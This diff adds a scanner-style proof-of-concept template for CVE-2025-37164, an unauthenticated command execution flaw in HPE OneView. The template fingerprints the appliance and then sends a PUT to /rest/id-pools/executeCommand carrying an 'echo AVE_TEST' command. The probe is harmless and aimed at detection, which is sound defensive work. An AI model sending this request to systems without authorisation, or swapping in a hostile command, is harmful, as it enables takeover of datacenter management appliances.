@@ -1,0 +1,54 @@
+[info]
+author = "AVE"
+description = "HPE OneView unauthenticated remote code execution via /rest/id-pools/executeCommand endpoint"
+id = "POC-AVE-2025-0088"
+name = "CVE-2025-37164 PoC"
+severity = "critical"
+tags = [
+    "cve-2025-37164",
+    "hpe-oneview",
+    "rce",
+]
+vuln_id = [
+    "CVE-2025-37164",
+    "AVE-2025-0088",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/rest/appliance/version"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["softwareVersion"]
+
+[[poc.requests]]
+method = "PUT"
+path = "/rest/id-pools/executeCommand"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"cmd":"echo AVE_TEST","result":false}'
+type = "json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["ExecutableCommand"]
